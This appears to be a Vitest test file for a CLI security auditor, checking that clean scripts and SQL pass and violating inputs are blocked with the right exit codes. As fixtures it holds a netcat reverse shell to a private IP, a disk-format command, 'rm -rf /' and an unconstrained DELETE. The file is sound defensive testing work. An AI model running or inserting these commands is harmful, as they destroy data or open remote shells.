import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import { runCli, CLI_EXIT_CODES } from '../src/cli/index.js';

describe('CLI Exit Codes on Clean vs Violating Input Scripts (#116)', () => {
  const testDir = path.join(process.cwd(), 'temp_cli_test_dir');

  beforeEach(() => {
    if (!fs.existsSync(testDir)) {
      fs.mkdirSync(testDir, { recursive: true });
    }
  });

  afterEach(() => {
    if (fs.existsSync(testDir)) {
      fs.rmSync(testDir, { recursive: true, force: true });
    }
  });

  it('exits with code 0 on clean shell script file', async () => {
    const scriptPath = path.join(testDir, 'safe_build.sh');
    fs.writeFileSync(scriptPath, '#!/bin/bash\necho "Compiling..."\nnpm run build\n', 'utf8');

    let out = '';
    const code = await runCli(['audit', scriptPath], (msg) => (out += msg));

    expect(code).toBe(CLI_EXIT_CODES.SUCCESS);
    expect(out).toContain('PASSED');
    expect(out).toContain('passed zero-trust security audit');
  });

  it('exits with code 1 on destructive disk wipe script', async () => {
    const scriptPath = path.join(testDir, 'dangerous_wipe.sh');
    fs.writeFileSync(scriptPath, '#!/bin/bash\nmkfs.ext4 /dev/nvme0n1\n', 'utf8');

    let out = '';
    const code = await runCli(['audit', scriptPath], (msg) => (out += msg));

    expect(code).toBe(CLI_EXIT_CODES.VIOLATION_BLOCKED);
    expect(out).toContain('BLOCKED');
    expect(out).toContain('Block Disk Formatting');
  });

  it('exits with code 1 on reverse shell payload script', async () => {
    const scriptPath = path.join(testDir, 'reverse_shell.sh');
    fs.writeFileSync(scriptPath, '#!/bin/bash\nnc -e /bin/sh 192.168.1.50 4444\n', 'utf8');

    let out = '';
    const code = await runCli(['audit', scriptPath], (msg) => (out += msg));

    expect(code).toBe(CLI_EXIT_CODES.VIOLATION_BLOCKED);
    expect(out).toContain('BLOCKED');
    expect(out).toContain('Reverse Shell');
  });

  it('exits with code 0 on clean SQL query file', async () => {
    const sqlPath = path.join(testDir, 'safe_select.sql');
    fs.writeFileSync(sqlPath, 'SELECT id, username, email FROM users WHERE id = 100 LIMIT 1;', 'utf8');

    let out = '';
    const code = await runCli(['audit', sqlPath], (msg) => (out += msg));

    expect(code).toBe(CLI_EXIT_CODES.SUCCESS);
    expect(out).toContain('PASSED');
  });

  it('exits with code 1 on unconstrained DELETE SQL file', async () => {
    const sqlPath = path.join(testDir, 'bad_delete.sql');
    fs.writeFileSync(sqlPath, 'DELETE FROM customers;', 'utf8');

    let out = '';
    const code = await runCli(['audit', sqlPath], (msg) => (out += msg));

    expect(code).toBe(CLI_EXIT_CODES.VIOLATION_BLOCKED);
    expect(out).toContain('BLOCKED');
    expect(out).toContain('Unconstrained DELETE');
  });

  it('produces valid parseable JSON report when --format json is provided', async () => {
    let out = '';
    const code = await runCli(['check', '--cmd', 'rm -rf /', '--format', 'json'], (msg) => (out += msg));

    expect(code).toBe(CLI_EXIT_CODES.VIOLATION_BLOCKED);

    const parsed = JSON.parse(out);
    expect(parsed.clean).toBe(false);
    expect(parsed.verdict).toBe('BLOCK');
    expect(parsed.violations.length).toBeGreaterThan(0);
    expect(typeof parsed.latencyMs).toBe('number');
  });

  it('exits with INVALID_ARGS (code 3) when check command has no command specified', async () => {
    let err = '';
    const code = await runCli(['check'], () => {}, (msg) => (err += msg));

    expect(code).toBe(CLI_EXIT_CODES.INVALID_ARGS);
    expect(err).toContain('No command specified');
  });

  it('exits with PARSE_ERROR (code 4) when eval command receives malformed JSON', async () => {
    let err = '';
    const code = await runCli(
      ['eval', '--tool', 'run_tool', '--params', '{not-valid-json}'],
      () => {},
      (msg) => (err += msg)
    );

    expect(code).toBe(CLI_EXIT_CODES.PARSE_ERROR);
    expect(err).toContain('Error parsing JSON params');
  });
});
